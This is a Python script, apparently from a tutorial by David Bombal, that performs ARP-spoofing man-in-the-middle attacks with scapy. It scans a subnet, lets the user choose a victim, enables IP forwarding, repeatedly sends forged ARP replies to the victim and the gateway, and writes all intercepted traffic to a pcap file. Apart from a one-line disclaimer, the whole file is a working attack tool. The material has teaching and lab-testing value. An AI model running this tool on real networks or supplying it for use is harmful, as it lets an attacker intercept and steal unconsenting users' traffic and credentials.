#!/user/bin python3

# Disclaimer: This script is for educational purposes only.  
# Do not use against any network that you don't own or have authorization to test. 
# To run this script use:
# sudo python3 arp_spoof.py -ip_range 10.0.0.0/24 (ex. 192.168.1.0/24)

import scapy.all as scapy
import subprocess
import sys
import time
import os
from ipaddress import IPv4Network
import threading

# We want the current working directory.
cwd = os.getcwd()


# Function to check whether the script was run with sudo privileges. 
# It will stop the execution if user didn't use sudo. 
def in_sudo_mode():
    """If the user doesn't run the program with super user privileges, don't allow them to continue."""
    if not 'SUDO_UID' in os.environ.keys():
        print("Try running this program with sudo.")
        exit()


def arp_scan(ip_range):
    """We use the arping method in scapy. It is a better implementation than writing your own arp scan. You'll often see that your own arp scan doesn't pick up
       mobile devices. You can see the way scapy implemented the function here: https://github.com/secdev/scapy/blob/master/scapy/layers/l2.py#L726-L749
       Arguments: ip_range -> an example would be "10.0.0.0/24"
    """
    # We create an empty list where we will store the pairs of ARP responses.
    arp_responses = list()
    # We send arp packets through the network, verbose is set to 0 so it won't show any output.
    # scapy's arping function returns two lists. We're interested in the answered results which is at the 0 index.
    answered_lst = scapy.arping(ip_range, verbose=0)[0]
    
    # We loop through all the responses and add them to a dictionary and append them to the list arp_responses.
    for res in answered_lst:
        # Every response will look something lke like -> {"ip" : "10.0.0.4", "mac" : "00:00:00:00:00:00"}
        arp_responses.append({"ip" : res[1].psrc, "mac" : res[1].hwsrc})
    
    # We return the list of arp responses which contains dictionaries for every arp response.
    return arp_responses


def is_gateway(gateway_ip):
    """We can see the gateway by running the route -n command
       Argument: The gateway_ip address which the program finds automatically should be supplied as an argument.
    """
    # We run the command route -n which returns information about the gateways.
    result = subprocess.run(["route", "-n"], capture_output=True).stdout.decode().split("\n")
    # Loop through every row in the route -n command.
    for row in result:
        # We look to see if the gateway_ip is in the row, if it is we return True. If False program continues flow and returns False.
        if gateway_ip in row:
            return True
    
    return False


def get_interface_names():
    """The interface names of a networks are listed in the /sys/class/net folder in Kali. This function returns a list of interfaces in Kali."""
    # The interface names are directory names in the /sys/class/net folder. So we change the directory to go there.
    os.chdir("/sys/class/net")
    # We use the listdir() function from the os module. Since we know there won't be files and only directories with the interface names we can save the output as the interface names.
    interface_names = os.listdir()
    # We return the interface names which we will use to find out which one is the name of the gateway.
    return interface_names


def match_iface_name(row):
    # We get all the interface names by running the function defined above with the 
    interface_names = get_interface_names()

    # Check if the interface name is in the row. If it is then we return the iface name.
    for iface in interface_names:
        if iface in row:
            return iface
    

def gateway_info(network_info):
    """We can see the gateway by running the route -n command. This get us the gateway information. We also need the name of the interface for the sniffer function.
        Arguments: network_info -> We supply the arp_scan() data.
    """
    # We run route -n and capture the output.
    result = subprocess.run(["route", "-n"], capture_output=True).stdout.decode().split("\n")
    # We declare an empty list for the gateways.
    gateways = []
    # We supplied the arp_scan() results (which is a list) as an argument to the network_info parameter.
    for iface in network_info:
        for row in result:
            # We want the gateway information to be saved to list called gateways. We know the ip of the gateway so we can compare and see in which row it appears.
            if iface["ip"] in row:
                iface_name = match_iface_name(row)
                # Once we found the gateway, we create a dictionary with all of its names.
                gateways.append({"iface" : iface_name, "ip" : iface["ip"], "mac" : iface["mac"]})

    return gateways


def clients(arp_res, gateway_res):
    """This function returns a list with only the clients. The gateway is removed from the list. Generally you did get the ARP response from the gateway at the 0 index
       but I did find that sometimes this may not be the case.
       Arguments: arp_res (The response from the ARP scan), gateway_res (The response from the gatway_info function.)
    """
    # In the menu we only want to give you access to the clients whose arp tables you want to poison. The gateway needs to be removed.
    client_list = []
    for gateway in gateway_res:
        for item in arp_res:
            # All items which are not the gateway will be appended to the client_list.
            if gateway["ip"] != item["ip"]:
                client_list.append(item)
    # return the list with the clients which will be used for the menu.
    return client_list


def allow_ip_forwarding():
    """ Run this function to allow ip forwarding. The packets will flow through your machine, and you'll be able to capture them. Otherwise user will lose connection."""
    # You would normally run the command sysctl -w net.ipv4.ip_forward=1 to enable ip forwarding. We run this with subprocess.run()
    subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"])
    # Load  in sysctl settings from the /etc/sysctl.conf file. 
    subprocess.run(["sysctl", "-p", "/etc/sysctl.conf"])


def arp_spoofer(target_ip, target_mac, spoof_ip):
    """ To update the ARP tables this function needs to be ran twice. Once with the gateway ip and mac, and then with the ip and mac of the target.
    Arguments: target ip address, target mac, and the spoof ip address.
    """
    # We want to create an ARP response, by default op=1 which is "who-has" request, to op=2 which is a "is-at" response packet.
    # We can fool the ARP cache by sending a fake packet saying that we're at the router's ip to the target machine, and sending a packet to the router that we are at the target machine's ip.
    pkt = scapy.ARP(op=2,pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    # ARP is a layer 3 protocol. So we use scapy.send(). We choose it to be verbose so we don't see the output.
    scapy.send(pkt, verbose=False)


def send_spoof_packets():
    # We need to send spoof packets to the gateway and the target device.
    while True:
        # We send an arp packet to the gateway saying that we are the the target machine.
        arp_spoofer(gateway_info["ip"], gateway_info["mac"], node_to_spoof["ip"])
        # We send an arp packet to the target machine saying that we are gateway.
        arp_spoofer(node_to_spoof["ip"], node_to_spoof["mac"], gateway_info["ip"])
        # Tested time.sleep() with different values. 3s seems adequate.
        time.sleep(3)


def packet_sniffer(interface):
    """ This function will be a packet sniffer to capture all the packets sent to the computer whilst this computer is the MITM. """
    # We use the sniff function to sniff the packets going through the gateway interface. We don't store them as it takes a lot of resources. The process_sniffed_pkt is a callback function that will run on each packet.
    packets = scapy.sniff(iface = interface, store = False, prn = process_sniffed_pkt)


def process_sniffed_pkt(pkt):
    """ This function is a callback function that works with the packet sniffer. It receives every packet that goes through scapy.sniff(on_specified_interface) and writes it to a pcap file"""
    print("Writing to pcap file. Press ctrl + c to exit.")
    # We append every packet sniffed to the requests.pcap file which we can inspect with Wireshark.
    scapy.wrpcap("requests.pcap", pkt, append=True)


def print_arp_res(arp_res):
    """ This function creates a menu where you can pick the device whose arp cache you want to poison. """
    # Program Header
    # Basic user interface header
    print(r"""______            _     _  ______                 _           _ 
    |  _  \          (_)   | | | ___ \               | |         | |
    | | | |__ ___   ___  __| | | |_/ / ___  _ __ ___ | |__   __ _| |
    | | | / _` \ \ / / |/ _` | | ___ \/ _ \| '_ ` _ \| '_ \ / _` | |
    | |/ / (_| |\ V /| | (_| | | |_/ / (_) | | | | | | |_) | (_| | |
    |___/ \__,_| \_/ |_|\__,_| \____/ \___/|_| |_| |_|_.__/ \__,_|_|""")
    print("\n****************************************************************")
    print("\n* Copyright of David Bombal, 2021                              *")
    print("\n* https://www.davidbombal.com                                  *")
    print("\n* https://www.youtube.com/davidbombal                          *")
    print("\n****************************************************************")
    print("ID\t\tIP\t\t\tMAC Address")
    print("_________________________________________________________")
    for id, res in enumerate(arp_res):
        # We are formatting the to print the id (number in the list), the ip and lastly the mac address.
        print("{}\t\t{}\t\t{}".format(id,res['ip'], res['mac']))
    while True:
        try:
            # We have to verify the choice. If the choice is valid then the function returns the choice.
            choice = int(input("Please select the ID of the computer whose ARP cache you want to poison (ctrl+z to exit): "))
            if arp_res[choice]:
                return choice
        except:
            print("Please enter a valid choice!")


def get_cmd_arguments():
    """ This function validates the command line arguments supplied on program start-up"""
    ip_range = None
    # Ensure that they supplied the correct command line arguments.
    if len(sys.argv) - 1 > 0 and sys.argv[1] != "-ip_range":
        print("-ip_range flag not specified.")
        return ip_range
    elif len(sys.argv) - 1 > 0 and sys.argv[1] == "-ip_range":
        try:
            # If IPv4Network(3rd paramater is not a valid ip range, then will kick you to the except block.)
            print(f"{IPv4Network(sys.argv[2])}")
            # If it is valid it will assign the ip_range from the 3rd parameter.
            ip_range = sys.argv[2]
            print("Valid ip range entered through command-line.")
        except:
            print("Invalid command-line argument supplied.")
            
    return ip_range
        

# Checks if program ran in sudo mode
in_sudo_mode()

# Gets the ip range using the get_cmd_arguments()
ip_range = get_cmd_arguments()

# If the ip range is not valid, it would've assigned a None value and the program will exit from here.
if ip_range == None:
    print("No valid ip range specified. Exiting!")
    exit()

# If we don't run this function the internet will be down for the user.
allow_ip_forwarding()

# Do the arp scan. The function returns a list of all clients.
arp_res = arp_scan(ip_range)

# If there is no connection exit the script.
if len(arp_res) == 0:
    print("No connection. Exiting, make sure devices are active or turned on.")
    exit()

# The function runs route -n command. Returns a list with the gateway in a dictionary.
gateways = gateway_info(arp_res)

# The gateway will be in position 0 of the list, for easy use we just assign it to a variable.
gateway_info = gateways[0]

# The gateways are removed from the clients.
client_info = clients(arp_res, gateways)

# If there are no clients, then the program will exit from here.
if len(client_info) == 0:
    print("No clients found when sending the ARP messages. Exiting, make sure devices are active or turned on.")
    exit()

# Show the  menu and assign the choice from the function to the variable -> choice
choice = print_arp_res(client_info)

# Select the node to spoof from the client_info list.
node_to_spoof = client_info[choice]

# get_interface_names()

# Setup the thread in the background which will send the arp spoof packets.
t1 = threading.Thread(target=send_spoof_packets, daemon=True)
# Start the thread.
t1.start()

# Change the directory again to the directory which contains the script, so it is a place where you have write privileges,
os.chdir(cwd)

# Run the packet sniffer on the interface. So we can capture all the packets and save it to a pcap file that can be opened in Wireshark.
packet_sniffer(gateway_info["iface"])
